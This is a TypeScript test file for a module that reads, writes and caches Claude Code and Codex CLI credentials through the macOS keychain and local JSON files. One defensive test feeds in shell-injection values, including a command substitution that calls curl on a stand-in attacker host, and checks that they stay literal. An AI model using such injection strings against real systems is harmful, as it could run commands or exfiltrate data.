import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

const execSyncMock = vi.fn();
const execFileSyncMock = vi.fn();
const CLI_CREDENTIALS_CACHE_TTL_MS = 15 * 60 * 1000;
let readClaudeCliCredentialsCached: typeof import("./cli-credentials.js").readClaudeCliCredentialsCached;
let readCodexCliCredentialsCached: typeof import("./cli-credentials.js").readCodexCliCredentialsCached;
let resetCliCredentialCachesForTest: typeof import("./cli-credentials.js").resetCliCredentialCachesForTest;
let writeClaudeCliKeychainCredentials: typeof import("./cli-credentials.js").writeClaudeCliKeychainCredentials;
let writeClaudeCliCredentials: typeof import("./cli-credentials.js").writeClaudeCliCredentials;
let readCodexCliCredentials: typeof import("./cli-credentials.js").readCodexCliCredentials;

function mockExistingClaudeKeychainItem() {
  execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
    const argv = Array.isArray(args) ? args.map(String) : [];
    if (String(file) === "security" && argv.includes("find-generic-password")) {
      return JSON.stringify({
        claudeAiOauth: {
          accessToken: "old-access",
          refreshToken: "old-refresh",
          expiresAt: Date.now() + 60_000,
        },
      });
    }
    return "";
  });
}

function getAddGenericPasswordCall() {
  return execFileSyncMock.mock.calls.find(
    ([binary, args]) =>
      String(binary) === "security" &&
      Array.isArray(args) &&
      (args as unknown[]).map(String).includes("add-generic-password"),
  );
}

async function readCachedClaudeCliCredentials(allowKeychainPrompt: boolean) {
  return readClaudeCliCredentialsCached({
    allowKeychainPrompt,
    ttlMs: CLI_CREDENTIALS_CACHE_TTL_MS,
    platform: "darwin",
    execSync: execSyncMock,
  });
}

function createJwtWithExp(expSeconds: number): string {
  const encode = (value: Record<string, unknown>) =>
    Buffer.from(JSON.stringify(value)).toString("base64url");
  return `${encode({ alg: "RS256", typ: "JWT" })}.${encode({ exp: expSeconds })}.signature`;
}

function mockClaudeCliCredentialRead() {
  execSyncMock.mockImplementation(() =>
    JSON.stringify({
      claudeAiOauth: {
        accessToken: `token-${Date.now()}`,
        refreshToken: "cached-refresh",
        expiresAt: Date.now() + 60_000,
      },
    }),
  );
}

describe("cli credentials", () => {
  beforeAll(async () => {
    ({
      readClaudeCliCredentialsCached,
      readCodexCliCredentialsCached,
      resetCliCredentialCachesForTest,
      writeClaudeCliKeychainCredentials,
      writeClaudeCliCredentials,
      readCodexCliCredentials,
    } = await import("./cli-credentials.js"));
  });

  beforeEach(() => {
    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.useRealTimers();
    execSyncMock.mockClear().mockImplementation(() => undefined);
    execFileSyncMock.mockClear().mockImplementation(() => undefined);
    delete process.env.CODEX_HOME;
    resetCliCredentialCachesForTest();
  });

  it("updates the Claude Code keychain item in place", async () => {
    mockExistingClaudeKeychainItem();

    const ok = writeClaudeCliKeychainCredentials(
      {
        access: "new-access",
        refresh: "new-refresh",
        expires: Date.now() + 60_000,
      },
      { execFileSync: execFileSyncMock },
    );

    expect(ok).toBe(true);

    // Verify execFileSync was called with array args (no shell interpretation)
    expect(execFileSyncMock).toHaveBeenCalledTimes(2);
    const addCall = getAddGenericPasswordCall();
    expect(addCall?.[0]).toBe("security");
    expect((addCall?.[1] as string[] | undefined) ?? []).toContain("-U");
  });

  it.each([
    {
      access: "x'$(curl attacker.com/exfil)'y",
      refresh: "safe-refresh",
      expectedPayload: "x'$(curl attacker.com/exfil)'y",
    },
    {
      access: "safe-access",
      refresh: "token`id`value",
      expectedPayload: "token`id`value",
    },
  ] as const)(
    "prevents shell injection via untrusted token payload value $expectedPayload",
    async ({ access, refresh, expectedPayload }) => {
      execFileSyncMock.mockClear();
      mockExistingClaudeKeychainItem();

      const ok = writeClaudeCliKeychainCredentials(
        {
          access,
          refresh,
          expires: Date.now() + 60_000,
        },
        { execFileSync: execFileSyncMock },
      );

      expect(ok).toBe(true);

      // Token payloads must remain literal in argv, never shell-interpreted.
      const addCall = getAddGenericPasswordCall();
      const args = (addCall?.[1] as string[] | undefined) ?? [];
      const wIndex = args.indexOf("-w");
      const passwordValue = args[wIndex + 1];
      expect(passwordValue).toContain(expectedPayload);
      expect(addCall?.[0]).toBe("security");
    },
  );

  it("falls back to the file store when the keychain update fails", async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-"));
    const credPath = path.join(tempDir, ".claude", ".credentials.json");

    fs.mkdirSync(path.dirname(credPath), { recursive: true, mode: 0o700 });
    fs.writeFileSync(
      credPath,
      `${JSON.stringify(
        {
          claudeAiOauth: {
            accessToken: "old-access",
            refreshToken: "old-refresh",
            expiresAt: Date.now() + 60_000,
          },
        },
        null,
        2,
      )}\n`,
      "utf8",
    );

    const writeKeychain = vi.fn(() => false);

    const ok = writeClaudeCliCredentials(
      {
        access: "new-access",
        refresh: "new-refresh",
        expires: Date.now() + 120_000,
      },
      {
        platform: "darwin",
        homeDir: tempDir,
        writeKeychain,
      },
    );

    expect(ok).toBe(true);
    expect(writeKeychain).toHaveBeenCalledTimes(1);

    const updated = JSON.parse(fs.readFileSync(credPath, "utf8")) as {
      claudeAiOauth?: {
        accessToken?: string;
        refreshToken?: string;
        expiresAt?: number;
      };
    };

    expect(updated.claudeAiOauth?.accessToken).toBe("new-access");
    expect(updated.claudeAiOauth?.refreshToken).toBe("new-refresh");
    expect(updated.claudeAiOauth?.expiresAt).toBeTypeOf("number");
  });

  it.each([
    {
      name: "caches Claude Code CLI credentials within the TTL window",
      allowKeychainPromptSecondRead: false,
      advanceMs: 0,
      expectedCalls: 1,
      expectSameObject: true,
    },
    {
      name: "refreshes Claude Code CLI credentials after the TTL window",
      allowKeychainPromptSecondRead: true,
      advanceMs: CLI_CREDENTIALS_CACHE_TTL_MS + 1,
      expectedCalls: 2,
      expectSameObject: false,
    },
  ] as const)(
    "$name",
    async ({ allowKeychainPromptSecondRead, advanceMs, expectedCalls, expectSameObject }) => {
      mockClaudeCliCredentialRead();
      vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));

      const first = await readCachedClaudeCliCredentials(true);
      if (advanceMs > 0) {
        vi.advanceTimersByTime(advanceMs);
      }
      const second = await readCachedClaudeCliCredentials(allowKeychainPromptSecondRead);

      expect(first).toBeTruthy();
      expect(second).toBeTruthy();
      if (expectSameObject) {
        expect(second).toEqual(first);
      } else {
        expect(second).not.toEqual(first);
      }
      expect(execSyncMock).toHaveBeenCalledTimes(expectedCalls);
    },
  );

  it("reads Codex credentials from keychain when available", async () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
    process.env.CODEX_HOME = tempHome;
    const expSeconds = Math.floor(Date.parse("2026-03-23T00:48:49Z") / 1000);

    const accountHash = "cli|";

    execSyncMock.mockImplementation((command: unknown) => {
      const cmd = String(command);
      expect(cmd).toContain("Codex Auth");
      expect(cmd).toContain(accountHash);
      return JSON.stringify({
        tokens: {
          id_token: "keychain-id-token",
          access_token: createJwtWithExp(expSeconds),
          refresh_token: "keychain-refresh",
        },
        last_refresh: "2026-01-01T00:00:00Z",
      });
    });

    const creds = readCodexCliCredentials({ platform: "darwin", execSync: execSyncMock });

    expect(creds).toMatchObject({
      access: createJwtWithExp(expSeconds),
      refresh: "keychain-refresh",
      provider: "openai-codex",
      expires: expSeconds * 1000,
      idToken: "keychain-id-token",
    });
  });

  it("falls back to Codex auth.json when keychain is unavailable", async () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
    process.env.CODEX_HOME = tempHome;
    const expSeconds = Math.floor(Date.parse("2026-03-24T12:34:56Z") / 1000);
    execSyncMock.mockImplementation(() => {
      throw new Error("not found");
    });

    const authPath = path.join(tempHome, "auth.json");
    fs.mkdirSync(tempHome, { recursive: true, mode: 0o700 });
    fs.writeFileSync(
      authPath,
      JSON.stringify({
        tokens: {
          id_token: "file-id-token",
          access_token: createJwtWithExp(expSeconds),
          refresh_token: "file-refresh",
        },
      }),
      "utf8",
    );

    const creds = readCodexCliCredentials({ execSync: execSyncMock });

    expect(creds).toMatchObject({
      access: createJwtWithExp(expSeconds),
      refresh: "file-refresh",
      provider: "openai-codex",
      expires: expSeconds * 1000,
      idToken: "file-id-token",
    });
  });

  it("invalidates cached Codex credentials when auth.json changes within the TTL window", () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-cache-"));
    process.env.CODEX_HOME = tempHome;
    const authPath = path.join(tempHome, "auth.json");
    const firstExpiry = Math.floor(Date.parse("2026-03-24T12:34:56Z") / 1000);
    const secondExpiry = Math.floor(Date.parse("2026-03-25T12:34:56Z") / 1000);
    try {
      fs.mkdirSync(tempHome, { recursive: true, mode: 0o700 });
      fs.writeFileSync(
        authPath,
        JSON.stringify({
          tokens: {
            access_token: createJwtWithExp(firstExpiry),
            refresh_token: "stale-refresh",
          },
        }),
        "utf8",
      );
      fs.utimesSync(authPath, new Date("2026-03-24T10:00:00Z"), new Date("2026-03-24T10:00:00Z"));
      vi.setSystemTime(new Date("2026-03-24T10:00:00Z"));

      const first = readCodexCliCredentialsCached({
        ttlMs: CLI_CREDENTIALS_CACHE_TTL_MS,
        platform: "linux",
        execSync: execSyncMock,
      });

      expect(first).toMatchObject({
        refresh: "stale-refresh",
        expires: firstExpiry * 1000,
      });

      fs.writeFileSync(
        authPath,
        JSON.stringify({
          tokens: {
            access_token: createJwtWithExp(secondExpiry),
            refresh_token: "fresh-refresh",
          },
        }),
        "utf8",
      );
      fs.utimesSync(authPath, new Date("2026-03-24T10:05:00Z"), new Date("2026-03-24T10:05:00Z"));
      vi.advanceTimersByTime(60_000);

      const second = readCodexCliCredentialsCached({
        ttlMs: CLI_CREDENTIALS_CACHE_TTL_MS,
        platform: "linux",
        execSync: execSyncMock,
      });

      expect(second).toMatchObject({
        refresh: "fresh-refresh",
        expires: secondExpiry * 1000,
      });
    } finally {
      fs.rmSync(tempHome, { recursive: true, force: true });
    }
  });
});
